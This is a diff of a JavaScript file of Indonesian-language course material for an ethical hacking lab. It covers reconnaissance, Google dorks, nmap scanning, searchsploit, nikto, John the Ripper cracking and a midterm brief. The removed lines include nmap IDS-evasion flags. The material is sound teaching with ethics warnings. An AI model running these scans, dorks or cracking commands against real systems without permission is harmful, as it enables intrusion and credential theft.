@@ -1,113 +1,160 @@
 // Material/Theory content for each lab session
+// Format yang lebih terstruktur dan mudah dipahami
 export const labMaterials = {
   // Session 1: Introduction to Ethical Hacking & Reconnaissance
   session1: {
     theoryContent: `
-# 📚 Pengenalan Ethical Hacking & Reconnaissance
+# 🎓 Session 1: Pengenalan Ethical Hacking & Reconnaissance
 
-## 🎯 Apa itu Ethical Hacking?
+<div class="intro-box">
 
-**Ethical Hacking** (juga disebut Penetration Testing atau "Pentesting") adalah praktik menguji keamanan sistem komputer, jaringan, atau aplikasi dengan izin dari pemiliknya. Tujuannya adalah menemukan kerentanan sebelum penyerang jahat (malicious hacker) menemukannya.
+## 🎯 Apa yang Akan Dipelajari?
 
-### Perbedaan Hacker:
-| Tipe | Deskripsi |
-|------|-----------|
-| **White Hat** | Hacker etis yang bekerja dengan izin untuk menemukan kelemahan keamanan |
-| **Black Hat** | Hacker jahat yang mengeksploitasi sistem tanpa izin untuk keuntungan pribadi |
-| **Grey Hat** | Berada di antara keduanya, mungkin tanpa izin tapi tidak bermaksud jahat |
+Selamat datang di dunia **Ethical Hacking**! Di sesi ini, kamu akan mempelajari dasar-dasar hacking yang bertanggung jawab dan teknik reconnaissance (pengintaian).
+
+</div>
 
 ---
 
-## 🔍 Metodologi Penetration Testing
+## 📚 Bagian 1: Memahami Ethical Hacking
 
-Penetration testing mengikuti metodologi terstruktur yang terdiri dari beberapa fase:
+### 🤔 Apa itu Ethical Hacking?
 
-### 1. **Reconnaissance (Pengintaian)**
-Fase pengumpulan informasi tentang target. Dibagi menjadi:
-- **Passive Reconnaissance**: Mengumpulkan informasi tanpa berinteraksi langsung dengan target (OSINT)
-- **Active Reconnaissance**: Berinteraksi langsung dengan target (scanning, probing)
+**Ethical Hacking** adalah praktik menguji keamanan sistem dengan **izin resmi** dari pemiliknya. Bayangkan seperti "pencuri" yang dipekerjakan untuk menguji keamanan rumah - mereka mencari kelemahan agar bisa diperbaiki.
 
-### 2. **Scanning & Enumeration**
-Mengidentifikasi:
-- Port yang terbuka
-- Layanan yang berjalan
-- Versi software
-- Kerentanan potensial
+<div class="comparison-table">
 
-### 3. **Gaining Access (Exploitation)**
-Mengeksploitasi kerentanan yang ditemukan untuk mendapatkan akses ke sistem.
+### 🎭 Tipe-tipe Hacker
 
-### 4. **Maintaining Access**
-Mempertahankan akses ke sistem yang telah dikompromikan.
+| 🎨 Tipe | 🎯 Tujuan | ⚖️ Legal? |
+|---------|----------|-----------|
+| **🤍 White Hat** | Membantu menemukan & memperbaiki celah keamanan | ✅ Legal (dengan izin) |
+| **🖤 Black Hat** | Mengeksploitasi untuk keuntungan pribadi | ❌ Ilegal |
+| **🩶 Grey Hat** | Campuran keduanya, niat baik tapi tanpa izin | ⚠️ Abu-abu |
 
-### 5. **Covering Tracks & Reporting**
-Membersihkan jejak dan membuat laporan komprehensif.
+</div>
+
+> 💡 **Ingat**: Kamu harus SELALU mendapatkan izin tertulis sebelum melakukan pengujian keamanan!
 
 ---
 
-## 🌐 OSINT (Open Source Intelligence)
+## 📚 Bagian 2: Metodologi Penetration Testing
 
-OSINT adalah teknik mengumpulkan informasi dari sumber publik yang tersedia secara legal. Sumber OSINT meliputi:
+Setiap pentest profesional mengikuti 5 fase ini:
 
-### Sumber Informasi:
-- **Domain & DNS**: WHOIS, DNS records, subdomains
-- **Search Engines**: Google dorks, Bing, Shodan
-- **Social Media**: LinkedIn, Twitter, Facebook
-- **Public Records**: Database perusahaan, paten, dokumen publik
-- **Code Repositories**: GitHub, GitLab, leaked credentials
+<div class="steps">
 
-### Contoh Google Dorks:
+### 🔄 5 Fase Penetration Testing
+
+**1️⃣ Reconnaissance (Pengintaian)**
+> Mengumpulkan informasi tentang target tanpa menyentuhnya langsung
+
+**2️⃣ Scanning & Enumeration**
+> Mengidentifikasi port, layanan, dan versi yang berjalan
+
+**3️⃣ Gaining Access (Eksploitasi)**
+> Memanfaatkan kerentanan untuk masuk ke sistem
+
+**4️⃣ Maintaining Access**
+> Mempertahankan akses untuk pengujian lebih lanjut
+
+**5️⃣ Reporting**
+> Membuat laporan temuan dan rekomendasi
+
+</div>
+
+---
+
+## 📚 Bagian 3: OSINT - Seni Mengumpulkan Informasi
+
+### 🌐 Apa itu OSINT?
+
+**OSINT** (Open Source Intelligence) adalah teknik mengumpulkan informasi dari sumber-sumber **publik dan legal**.
+
+<div class="info-box">
+
+### 🔍 Sumber-sumber OSINT
+
+| 📂 Kategori | 📋 Contoh Sumber |
+|-------------|------------------|
+| **Domain & DNS** | WHOIS, nslookup, dig |
+| **Search Engine** | Google Dorks, Shodan |
+| **Social Media** | LinkedIn, Twitter, Facebook |
+| **Code** | GitHub, GitLab (kredensial bocor) |
+| **Arsip** | Wayback Machine |
+
+</div>
+
+### 🎯 Contoh Google Dorks
+
 \`\`\`
-site:example.com filetype:pdf     # Cari file PDF di domain
-inurl:admin site:example.com      # Cari halaman admin
-"password" filetype:txt           # Cari file text berisi password
+# Mencari file PDF di suatu domain
+site:example.com filetype:pdf
+
+# Mencari halaman admin
+inurl:admin site:example.com
+
+# Mencari file yang berisi "password"
+"password" filetype:txt site:example.com
 \`\`\`
 
 ---
 
-## ⚖️ Aspek Legal & Etika
+## 📚 Bagian 4: Tools yang Akan Digunakan
 
-### Yang HARUS dilakukan:
-✅ Selalu dapatkan **izin tertulis** sebelum melakukan pengujian
-✅ Dokumentasikan semua aktivitas dengan detail
-✅ Laporkan semua temuan kepada klien
-✅ Jaga kerahasiaan data yang ditemukan
-✅ Ikuti scope yang telah disepakati
+<div class="tools-grid">
 
-### Yang TIDAK BOLEH dilakukan:
-❌ Mengakses sistem tanpa izin
-❌ Memodifikasi atau menghapus data
-❌ Menyebarkan informasi sensitif
-❌ Melakukan serangan DoS tanpa izin
-❌ Melampaui batas scope pengujian
+### 🛠️ Arsenal Recon
 
----
+| 🔧 Tool | 📝 Fungsi | 💻 Contoh |
+|---------|-----------|-----------|
+| \`whois\` | Cek info registrasi domain | \`whois google.com\` |
+| \`nslookup\` | Query DNS dasar | \`nslookup google.com\` |
+| \`dig\` | Query DNS advanced | \`dig google.com MX\` |
+| \`host\` | DNS lookup simpel | \`host google.com\` |
+| \`ping\` | Test konektivitas | \`ping 192.168.1.1\` |
+| \`traceroute\` | Lacak jalur paket | \`traceroute google.com\` |
 
-## 🛠️ Tools yang Akan Digunakan
-
-| Tool | Fungsi |
-|------|--------|
-| \`whois\` | Lookup informasi registrasi domain |
-| \`nslookup\` | Query DNS records |
-| \`dig\` | Advanced DNS query tool |
-| \`host\` | Simple DNS lookup |
-| \`traceroute\` | Trace network path |
-| \`ping\` | Test konektivitas jaringan |
+</div>
 
 ---
 
-## 📋 Tugas Praktikum
+## ⚠️ Aspek Legal & Etika
 
-Dalam praktikum ini, Anda akan:
-1. Melakukan WHOIS lookup pada target domain
-2. Mengumpulkan informasi DNS (A, MX, NS records)
-3. Mengidentifikasi subdomain
-4. Melakukan passive reconnaissance
-5. Mendokumentasikan semua temuan
+<div class="warning-box">
 
-**Target**: example-company.com (192.168.1.100)
+### ✅ WAJIB Dilakukan:
+- 📝 Dapatkan **izin tertulis** sebelum pengujian
+- 📋 Dokumentasikan semua aktivitas
+- 🔒 Jaga kerahasiaan data yang ditemukan
+- 🎯 Tetap dalam scope yang disepakati
 
-> ⚠️ **Ingat**: Ini adalah lingkungan simulasi. Jangan pernah melakukan teknik ini pada sistem tanpa izin!
+### ❌ DILARANG:
+- 🚫 Mengakses sistem tanpa izin
+- 🚫 Memodifikasi atau menghapus data
+- 🚫 Menyebarkan informasi sensitif
+- 🚫 Melakukan DoS attack
+
+</div>
+
+---
+
+## 🎯 Tugas Praktikum Sesi Ini
+
+<div class="task-box">
+
+### 📋 Yang Harus Kamu Lakukan:
+
+1. ✅ Lakukan **WHOIS lookup** pada target domain
+2. ✅ Kumpulkan informasi **DNS** (A, MX, NS records)
+3. ✅ Identifikasi **subdomain** yang ada
+4. ✅ Dokumentasikan semua temuan
+
+**🎯 Target**: example-company.com (192.168.1.100)
+
+</div>
+
+> 🔐 **Reminder**: Ini adalah lingkungan simulasi. Jangan pernah melakukan teknik ini pada sistem nyata tanpa izin!
 `,
     prerequisites: [
       'Pemahaman dasar jaringan komputer (IP, DNS, HTTP)',
@@ -133,157 +180,206 @@ Dalam praktikum ini, Anda akan:
   // Session 2: Network Scanning with Nmap
   session2: {
     theoryContent: `
-# 🔍 Network Scanning dengan Nmap
+# 🔍 Session 2: Network Scanning dengan Nmap
 
-## 🎯 Apa itu Network Scanning?
+<div class="intro-box">
 
-**Network Scanning** adalah proses mengidentifikasi host aktif, port terbuka, dan layanan yang berjalan pada sebuah jaringan. Ini adalah langkah penting setelah reconnaissance dalam metodologi penetration testing.
+## 🎯 Apa yang Akan Dipelajari?
 
----
+Di sesi ini kamu akan mempelajari cara melakukan **network scanning** menggunakan **Nmap**, tool paling powerful untuk memetakan jaringan dan menemukan layanan yang berjalan.
 
-## 🛠️ Nmap - Network Mapper
-
-**Nmap** (Network Mapper) adalah tool scanning paling populer dan powerful untuk:
-- Host discovery
-- Port scanning
-- Service/version detection
-- OS detection
-- Vulnerability scanning (dengan NSE scripts)
+</div>
 
 ---
 
-## 📊 Jenis-jenis Port Scan
+## 📚 Bagian 1: Pengantar Network Scanning
 
-### 1. TCP Connect Scan (-sT)
+### 🌐 Apa itu Network Scanning?
+
+**Network Scanning** adalah proses mengidentifikasi:
+- 🖥️ Host yang aktif di jaringan
+- 🚪 Port yang terbuka
+- 📦 Layanan yang berjalan
+- 💻 Sistem operasi target
+
+<div class="info-box">
+
+### 🛠️ Nmap (Network Mapper)
+
+**Nmap** adalah tool scanning paling populer dengan kemampuan:
+- ✅ Host discovery (menemukan host aktif)
+- ✅ Port scanning (mengecek port terbuka)
+- ✅ Service detection (mendeteksi layanan)
+- ✅ OS detection (mendeteksi sistem operasi)
+- ✅ Vulnerability scanning (dengan NSE scripts)
+
+</div>
+
+---
+
+## 📚 Bagian 2: Jenis-jenis Port Scan
+
+### 🔌 1. TCP Connect Scan (\`-sT\`)
+
 \`\`\`
 ┌─────────┐     SYN      ┌─────────┐
-│ Scanner │────────────▶│ Target  │
+│ Scanner │────────────▶ │ Target  │
 │         │◀────────────│         │
 └─────────┘   SYN/ACK    └─────────┘
      │                        
-     └──────── ACK ──────────▶ (Connection established)
+     └──────── ACK ──────────▶ (Koneksi terbentuk)
 \`\`\`
-- Full TCP handshake
-- Paling akurat tapi mudah terdeteksi
-- Tidak memerlukan root privilege
 
-### 2. SYN Scan (-sS) "Stealth Scan"
+**Karakteristik:**
+- ✅ Full TCP 3-way handshake
+- ✅ Paling akurat
+- ⚠️ Mudah terdeteksi oleh firewall
+- ✅ Tidak perlu root privilege
+
+### ⚡ 2. SYN Scan (\`-sS\`) - "Stealth Scan"
+
 \`\`\`
 ┌─────────┐     SYN      ┌─────────┐
-│ Scanner │────────────▶│ Target  │
+│ Scanner │────────────▶ │ Target  │
 │         │◀────────────│         │
 └─────────┘   SYN/ACK    └─────────┘
      │                        
-     └──────── RST ──────────▶ (Connection reset)
+     └──────── RST ──────────▶ (Koneksi dibatalkan)
 \`\`\`
-- Tidak menyelesaikan handshake (half-open)
-- Lebih cepat dan kurang terdeteksi
-- Memerlukan root privilege
 
-### 3. UDP Scan (-sU)
-- Scan port UDP
-- Lebih lambat karena tidak ada acknowledgment
-- Penting untuk DNS, SNMP, DHCP
+**Karakteristik:**
+- ✅ Half-open scan (tidak selesai handshake)
+- ✅ Lebih cepat
+- ✅ Lebih sulit terdeteksi
+- ⚠️ Memerlukan root privilege
 
----
+### 📡 3. UDP Scan (\`-sU\`)
 
-## 🔢 Port States
-
-| State | Deskripsi |
-|-------|-----------|
-| **open** | Port menerima koneksi, ada layanan aktif |
-| **closed** | Port accessible tapi tidak ada layanan |
-| **filtered** | Firewall/filter memblokir probe |
-| **unfiltered** | Port accessible, tidak bisa tentukan open/closed |
-| **open\|filtered** | Tidak bisa tentukan open atau filtered |
+- Scan port UDP (DNS, SNMP, DHCP)
+- ⚠️ Lebih lambat dari TCP scan
+- Penting untuk layanan berbasis UDP
 
 ---
 
-## 🎯 Common Ports & Services
+## 📚 Bagian 3: Memahami Port States
+
+<div class="comparison-table">
+
+### 🚦 Status Port
+
+| 🎨 State | 📝 Arti | 🔍 Penjelasan |
+|----------|---------|---------------|
+| **🟢 open** | Terbuka | Ada layanan yang aktif menerima koneksi |
+| **🔴 closed** | Tertutup | Accessible tapi tidak ada layanan |
+| **🟡 filtered** | Difilter | Firewall memblokir, tidak bisa dipastikan |
+| **⚪ unfiltered** | Tidak difilter | Accessible, tapi status tidak jelas |
+
+</div>
+
+---
+
+## 📚 Bagian 4: Port-port Penting
+
+<div class="tools-grid">
+
+### 🚪 Common Ports yang Wajib Diingat
 
 | Port | Service | Deskripsi |
 |------|---------|-----------|
-| 21 | FTP | File Transfer Protocol |
-| 22 | SSH | Secure Shell |
-| 23 | Telnet | Unencrypted remote login |
-| 25 | SMTP | Email sending |
-| 53 | DNS | Domain Name System |
-| 80 | HTTP | Web server |
-| 443 | HTTPS | Secure web server |
-| 445 | SMB | Windows file sharing |
-| 3306 | MySQL | Database |
-| 3389 | RDP | Remote Desktop |
+| **22** | SSH | Remote access aman |
+| **80** | HTTP | Web server |
+| **443** | HTTPS | Web server (encrypted) |
+| **21** | FTP | Transfer file |
+| **23** | Telnet | Remote access (tidak aman!) |
+| **25** | SMTP | Kirim email |
+| **53** | DNS | Domain name resolution |
+| **3306** | MySQL | Database |
+| **445** | SMB | File sharing Windows |
+| **3389** | RDP | Remote Desktop Windows |
+
+</div>
 
 ---
 
-## 📋 Nmap Scan Techniques
+## 📚 Bagian 5: Teknik-teknik Nmap
 
-### Host Discovery
+### 🔍 Host Discovery
+
 \`\`\`bash
-nmap -sn 192.168.1.0/24     # Ping scan (no port scan)
-nmap -Pn 192.168.1.100      # Skip host discovery
+# Ping scan - hanya cek host aktif (tanpa port scan)
+nmap -sn 192.168.1.0/24
+
+# Skip host discovery (anggap host aktif)
+nmap -Pn 192.168.1.100
 \`\`\`
 
-### Port Scanning
+### 🚪 Port Scanning
+
 \`\`\`bash
-nmap 192.168.1.100          # Scan top 1000 ports
-nmap -p- 192.168.1.100      # Scan ALL ports (65535)
-nmap -p 22,80,443 target    # Scan specific ports
-nmap -p 1-1000 target       # Scan port range
+# Scan 1000 port paling umum (default)
+nmap 192.168.1.100
+
+# Scan SEMUA port (65535)
+nmap -p- 192.168.1.100
+
+# Scan port tertentu
+nmap -p 22,80,443 192.168.1.100
+
+# Scan range port
+nmap -p 1-1000 192.168.1.100
 \`\`\`
 
-### Service & Version Detection
-\`\`\`bash
-nmap -sV 192.168.1.100      # Detect service versions
-nmap -O 192.168.1.100       # OS detection
-nmap -A 192.168.1.100       # Aggressive scan (OS + version + scripts)
-\`\`\`
-
-### Output Options
-\`\`\`bash
-nmap -oN scan.txt target    # Normal output
-nmap -oX scan.xml target    # XML output
-nmap -oG scan.gnmap target  # Grepable output
-\`\`\`
-
----
-
-## ⚡ Timing Templates
-
-| Template | Deskripsi |
-|----------|-----------|
-| -T0 | Paranoid (sangat lambat, IDS evasion) |
-| -T1 | Sneaky |
-| -T2 | Polite |
-| -T3 | Normal (default) |
-| -T4 | Aggressive (recommended) |
-| -T5 | Insane (mungkin kurang akurat) |
-
----
-
-## 🛡️ Firewall/IDS Evasion
+### 🔎 Service & Version Detection
 
 \`\`\`bash
-nmap -f target              # Fragment packets
-nmap --mtu 24 target        # Custom MTU
-nmap -D RND:10 target       # Decoy scan
-nmap --spoof-mac 0 target   # Spoof MAC address
+# Deteksi versi service
+nmap -sV 192.168.1.100
+
+# Deteksi OS
+nmap -O 192.168.1.100
+
+# Aggressive scan (OS + version + scripts + traceroute)
+nmap -A 192.168.1.100
 \`\`\`
 
 ---
 
-## 📋 Tugas Praktikum
+## ⏱️ Timing Templates
 
-Dalam praktikum ini, Anda akan:
-1. Melakukan ping scan untuk menemukan host aktif
-2. Melakukan SYN scan pada target
-3. Mendeteksi versi service yang berjalan
-4. Mengidentifikasi sistem operasi target
-5. Mendokumentasikan semua port dan service yang ditemukan
+<div class="info-box">
 
-**Target**: 192.168.1.100 (web.example-company.com)
+### 🎚️ Pengaturan Kecepatan Scan
 
-> 💡 **Tips**: Gunakan \`-T4\` untuk scan lebih cepat dan \`-v\` untuk output verbose.
+| Template | Nama | Penggunaan |
+|----------|------|------------|
+| \`-T0\` | Paranoid | IDS evasion, sangat lambat |
+| \`-T1\` | Sneaky | IDS evasion |
+| \`-T2\` | Polite | Tidak membebani jaringan |
+| \`-T3\` | Normal | Default |
+| **\`-T4\`** | **Aggressive** | **Recommended untuk lab** |
+| \`-T5\` | Insane | Sangat cepat, mungkin kurang akurat |
+
+</div>
+
+---
+
+## 🎯 Tugas Praktikum Sesi Ini
+
+<div class="task-box">
+
+### 📋 Yang Harus Kamu Lakukan:
+
+1. ✅ Lakukan **ping scan** untuk menemukan host aktif
+2. ✅ Lakukan **SYN scan** pada target
+3. ✅ **Deteksi versi** service yang berjalan
+4. ✅ **Identifikasi OS** target
+5. ✅ Dokumentasikan semua port dan service
+
+**🎯 Target**: 192.168.1.100 (web.example-company.com)
+
+</div>
+
+> 💡 **Tips**: Gunakan \`-T4\` untuk scan lebih cepat dan \`-v\` untuk output verbose!
 `,
     prerequisites: [
       'Pemahaman TCP/IP dan model OSI',
@@ -309,157 +405,184 @@ Dalam praktikum ini, Anda akan:
   // Session 3: Vulnerability Assessment & Password Cracking
   session3: {
     theoryContent: `
-# 🔐 Vulnerability Assessment & Password Cracking
+# 🔐 Session 3: Vulnerability Assessment & Password Cracking
 
-## 🎯 Apa itu Vulnerability Assessment?
+<div class="intro-box">
 
-**Vulnerability Assessment** adalah proses sistematis untuk mengidentifikasi, mengklasifikasi, dan memprioritaskan kerentanan keamanan dalam sistem komputer, aplikasi, dan infrastruktur jaringan.
+## 🎯 Apa yang Akan Dipelajari?
 
----
+Di sesi ini kamu akan mempelajari cara **mengidentifikasi kerentanan** dan teknik dasar **password cracking** menggunakan berbagai tools.
 
-## 📊 CVE & CVSS
-
-### CVE (Common Vulnerabilities and Exposures)
-CVE adalah sistem standar untuk mengidentifikasi kerentanan keamanan yang telah diketahui publik.
-
-Format: **CVE-YEAR-NUMBER**
-Contoh: CVE-2021-44228 (Log4Shell)
-
-### CVSS (Common Vulnerability Scoring System)
-Sistem scoring untuk mengukur severity kerentanan:
-
-| Score | Severity |
-|-------|----------|
-| 0.0 | None |
-| 0.1 - 3.9 | Low |
-| 4.0 - 6.9 | Medium |
-| 7.0 - 8.9 | High |
-| 9.0 - 10.0 | Critical |
+</div>
 
 ---
 
-## 🔍 Tools Vulnerability Scanning
+## 📚 Bagian 1: Vulnerability Assessment
 
-### Searchsploit
+### 🔍 Apa itu Vulnerability Assessment?
+
+**Vulnerability Assessment** adalah proses sistematis untuk:
+- 🔎 Mengidentifikasi kelemahan keamanan
+- 📊 Mengklasifikasi tingkat risiko
+- 📋 Memprioritaskan perbaikan
+
+---
+
+## 📚 Bagian 2: CVE & CVSS - Standar Industri
+
+### 🏷️ CVE (Common Vulnerabilities and Exposures)
+
+CVE adalah sistem penamaan standar untuk kerentanan.
+
+**Format**: \`CVE-TAHUN-NOMOR\`
+
+**Contoh:**
+- \`CVE-2021-44228\` - Log4Shell (sangat terkenal!)
+- \`CVE-2017-0144\` - EternalBlue
+
+### 📊 CVSS (Common Vulnerability Scoring System)
+
+<div class="comparison-table">
+
+### 🎚️ Skala Severity CVSS
+
+| Skor | Severity | Prioritas |
+|------|----------|-----------|
+| **9.0 - 10.0** | 🔴 Critical | Perbaiki SEGERA! |
+| **7.0 - 8.9** | 🟠 High | Prioritas tinggi |
+| **4.0 - 6.9** | 🟡 Medium | Dijadwalkan |
+| **0.1 - 3.9** | 🟢 Low | Ketika sempat |
+
+</div>
+
+---
+
+## 📚 Bagian 3: Tools Vulnerability Scanning
+
+### 🔍 Searchsploit
+
+Tool untuk mencari exploit dari database Exploit-DB.
+
 \`\`\`bash
-searchsploit apache 2.4      # Cari exploit Apache 2.4
-searchsploit -m 12345        # Copy exploit ke current dir
-searchsploit --update        # Update database
+# Cari exploit untuk Apache 2.4
+searchsploit apache 2.4
+
+# Copy exploit ke folder saat ini
+searchsploit -m 12345
+
+# Update database
+searchsploit --update
 \`\`\`
 
-### Nikto (Web Vulnerability Scanner)
+### 🕷️ Nikto (Web Scanner)
+
 \`\`\`bash
-nikto -h http://target.com   # Scan web server
-nikto -h target -p 8080      # Scan port spesifik
+# Scan web server
+nikto -h http://target.com
+
+# Scan port custom
+nikto -h target -p 8080
 \`\`\`
 
 ---
 
-## 🔑 Password Cracking
+## 📚 Bagian 4: Password Cracking
 
-### Jenis-jenis Hash
+### 🔑 Jenis-jenis Hash
 
-| Algorithm | Length | Contoh |
-|-----------|--------|--------|
-| MD5 | 32 chars | 5d41402abc4b2a76b9719d911017c592 |
-| SHA-1 | 40 chars | aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d |
-| SHA-256 | 64 chars | 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c... |
-| bcrypt | 60 chars | $2a$10$... |
+<div class="tools-grid">
 
-### Hashid - Identify Hash Type
+| 🔐 Algoritma | 📏 Panjang | 📝 Contoh |
+|--------------|-----------|-----------|
+| **MD5** | 32 karakter | \`5d41402abc4b2a76b9719d911017c592\` |
+| **SHA-1** | 40 karakter | \`aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d\` |
+| **SHA-256** | 64 karakter | \`2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e...\` |
+| **bcrypt** | 60 karakter | \`$2a$10$...\` |
+
+</div>
+
+### 🔍 Hashid - Identifikasi Tipe Hash
+
 \`\`\`bash
+# Identifikasi hash MD5
 hashid '5d41402abc4b2a76b9719d911017c592'
-hashid -m '$2a$10$...'  # Show hashcat mode
+
+# Tampilkan mode hashcat
+hashid -m '$2a$10$...'
 \`\`\`
 
 ---
 
-## 🔨 John the Ripper
+## 📚 Bagian 5: John the Ripper
 
-John adalah tool password cracking yang powerful dan mendukung banyak format hash.
+### 🔨 Tool Password Cracking Legendaris
 
-### Basic Usage
 \`\`\`bash
-john hashes.txt              # Crack dengan default wordlist
-john --wordlist=rockyou.txt hashes.txt  # Custom wordlist
-john --show hashes.txt       # Show cracked passwords
+# Crack dengan wordlist default
+john hashes.txt
+
+# Crack dengan wordlist custom
+john --wordlist=rockyou.txt hashes.txt
+
+# Lihat password yang sudah di-crack
+john --show hashes.txt
 \`\`\`
 
-### Attack Modes
+### ⚔️ Jenis Attack
 
-#### 1. Dictionary Attack
-\`\`\`bash
-john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-\`\`\`
+<div class="info-box">
 
-#### 2. Brute Force
-\`\`\`bash
-john --incremental hashes.txt
-\`\`\`
+**1️⃣ Dictionary Attack**
+> Menggunakan daftar kata yang umum dipakai sebagai password
+> Contoh wordlist: rockyou.txt (14 juta+ password!)
 
-#### 3. Rule-based Attack
-\`\`\`bash
-john --wordlist=words.txt --rules hashes.txt
-\`\`\`
+**2️⃣ Brute Force Attack**
+> Mencoba SEMUA kombinasi karakter
+> Sangat lambat tapi pasti
+
+**3️⃣ Rule-based Attack**
+> Dictionary + aturan modifikasi
+> Contoh: password → P@ssw0rd, password123
+
+</div>
 
 ---
 
-## 📋 Password Attack Types
+## 🛡️ Tips Password Security
 
-### 1. Dictionary Attack
-Menggunakan daftar kata (wordlist) yang umum digunakan sebagai password.
+<div class="warning-box">
 
-**Popular Wordlists:**
-- rockyou.txt (14 juta+ passwords)
-- darkweb2017-top10000.txt
-- common-passwords.txt
+### ✅ DO's:
+- 🔑 Minimal 12 karakter
+- 🔄 Kombinasi huruf, angka, simbol
+- 🔐 Gunakan password manager
+- 📱 Aktifkan 2FA
 
-### 2. Brute Force Attack
-Mencoba semua kombinasi karakter yang mungkin.
-\`\`\`
-Charset: abcdefghijklmnopqrstuvwxyz
-Length 4: 26^4 = 456,976 combinations
-Length 6: 26^6 = 308,915,776 combinations
-\`\`\`
+### ❌ DON'Ts:
+- 🚫 Gunakan info personal (tanggal lahir, nama)
+- 🚫 Reuse password di banyak situs
+- 🚫 Gunakan password umum (123456, password)
 
-### 3. Rainbow Table Attack
-Menggunakan tabel precomputed hashes untuk lookup cepat.
-
-### 4. Hybrid Attack
-Kombinasi dictionary + rules (contoh: password123, Password!, p@ssw0rd)
+</div>
 
 ---
 
-## 🛡️ Password Security Best Practices
+## 🎯 Tugas Praktikum Sesi Ini
 
-### Untuk Users:
-- ✅ Gunakan password minimal 12 karakter
-- ✅ Kombinasi uppercase, lowercase, angka, simbol
-- ✅ Gunakan password manager
-- ✅ Aktifkan 2FA
-- ❌ Jangan gunakan informasi personal
-- ❌ Jangan reuse password
+<div class="task-box">
 
-### Untuk Developers:
-- ✅ Gunakan algoritma hashing yang kuat (bcrypt, Argon2)
-- ✅ Implementasi salt yang unik per user
-- ✅ Rate limiting pada login
-- ✅ Account lockout setelah failed attempts
+### 📋 Yang Harus Kamu Lakukan:
 
----
+1. ✅ Cari kerentanan dengan **searchsploit**
+2. ✅ Identifikasi jenis hash dengan **hashid**
+3. ✅ Crack password dengan **John the Ripper**
+4. ✅ Dokumentasikan temuan dan rekomendasi
 
-## 📋 Tugas Praktikum
+**🎯 Target Hash**: \`5d41402abc4b2a76b9719d911017c592\` (MD5)
 
-Dalam praktikum ini, Anda akan:
-1. Mencari kerentanan menggunakan searchsploit
-2. Mengidentifikasi jenis hash dengan hashid
-3. Melakukan password cracking dengan John the Ripper
-4. Memahami metodologi vulnerability assessment
-5. Mendokumentasikan temuan dan rekomendasi
+</div>
 
-**Target Hash**: 5d41402abc4b2a76b9719d911017c592 (MD5)
-
-> ⚠️ **Etika**: Password cracking hanya boleh dilakukan pada hash yang Anda memiliki izin untuk crack!
+> ⚠️ **Etika**: Password cracking hanya boleh dilakukan pada hash yang kamu miliki izin untuk crack!
 `,
     prerequisites: [
       'Menyelesaikan Session 1 dan 2',
@@ -485,98 +608,85 @@ Dalam praktikum ini, Anda akan:
   // Session 4: UTS
   session4: {
     theoryContent: `
-# 📝 UTS - Reconnaissance & Scanning Project
+# 📝 Session 4: UTS - Reconnaissance & Scanning Project
 
-## 🎯 Tujuan Ujian
+<div class="intro-box">
 
-Ujian Tengah Semester (UTS) ini dirancang untuk menguji pemahaman dan kemampuan praktis Anda dalam:
-1. **Information Gathering (OSINT)**
-2. **Network Scanning**
-3. **Vulnerability Assessment**
+## 🎯 Ujian Tengah Semester
+
+Saatnya menguji kemampuanmu! UTS ini menggabungkan semua yang telah kamu pelajari di Session 1-3.
+
+</div>
 
 ---
 
-## 📋 Scope Pengujian
+## 📋 Informasi Ujian
 
-### Target
-- **Domain**: demo-company.com
-- **IP Range**: 10.0.0.0/24
-- **Primary Target**: 10.0.0.50
+<div class="info-box">
 
-### Deliverables
-1. Laporan OSINT tentang target
-2. Hasil network scanning lengkap
-3. Daftar kerentanan yang ditemukan
-4. Rekomendasi mitigasi
+### 📊 Detail UTS
+
+| 📌 Item | 📝 Keterangan |
+|---------|---------------|
+| **Durasi** | 120 menit |
+| **Target** | demo-company.com (10.0.0.50) |
+| **IP Range** | 10.0.0.0/24 |
+| **Format** | Praktikum + Laporan |
+
+</div>
 
 ---
 
 ## 📊 Rubrik Penilaian
 
-| Komponen | Bobot | Kriteria |
-|----------|-------|----------|
-| OSINT Gathering | 25% | Kelengkapan informasi yang dikumpulkan |
-| Network Scanning | 25% | Akurasi dan detail hasil scanning |
-| Vulnerability Identification | 25% | Identifikasi kerentanan yang tepat |
-| Report Quality | 25% | Format, kejelasan, dan profesionalisme laporan |
+<div class="comparison-table">
+
+| 📋 Komponen | 📊 Bobot | 📝 Kriteria |
+|-------------|----------|-------------|
+| **OSINT Gathering** | 25% | Kelengkapan informasi |
+| **Network Scanning** | 25% | Akurasi hasil scanning |
+| **Vulnerability ID** | 25% | Identifikasi kerentanan |
+| **Report Quality** | 25% | Profesionalisme laporan |
+
+</div>
 
 ---
 
-## ⏱️ Waktu Pengerjaan
+## 📝 Deliverables
 
-- **Durasi**: 120 menit
-- **Submission**: Melalui sistem setelah semua objective selesai
-
----
-
-## 📝 Format Laporan
-
-### 1. Executive Summary
-Ringkasan temuan utama untuk audience non-teknis.
-
-### 2. Methodology
-Langkah-langkah yang dilakukan selama pengujian.
-
-### 3. Findings
-Detail semua temuan dengan evidence (screenshot commands).
-
-### 4. Risk Assessment
-Penilaian risiko untuk setiap temuan.
-
-### 5. Recommendations
-Rekomendasi mitigasi yang spesifik dan actionable.
-
----
-
-## 🛠️ Tools yang Diizinkan
-
-| Category | Tools |
-|----------|-------|
-| OSINT | whois, nslookup, dig, host |
-| Scanning | nmap, ping, traceroute |
-| Vuln Assessment | searchsploit, nikto |
+1. **Laporan OSINT** tentang target
+2. **Hasil network scanning** lengkap
+3. **Daftar kerentanan** yang ditemukan
+4. **Rekomendasi mitigasi**
 
 ---
 
 ## ⚠️ Peraturan
 
-1. ✅ Semua aktivitas harus dilakukan dalam scope yang ditentukan
-2. ✅ Dokumentasikan setiap langkah yang dilakukan
-3. ❌ Dilarang melakukan serangan DoS
-4. ❌ Dilarang memodifikasi atau menghapus data
-5. ❌ Dilarang berbagi jawaban dengan mahasiswa lain
+<div class="warning-box">
+
+### ✅ Diperbolehkan:
+- Menggunakan semua tools dari Session 1-3
+- Dokumentasi setiap langkah
+
+### ❌ Dilarang:
+- Serangan DoS
+- Modifikasi/hapus data
+- Berbagi jawaban
+
+</div>
 
 ---
 
 ## 💡 Tips Sukses
 
-1. **Baca instruksi dengan teliti** sebelum memulai
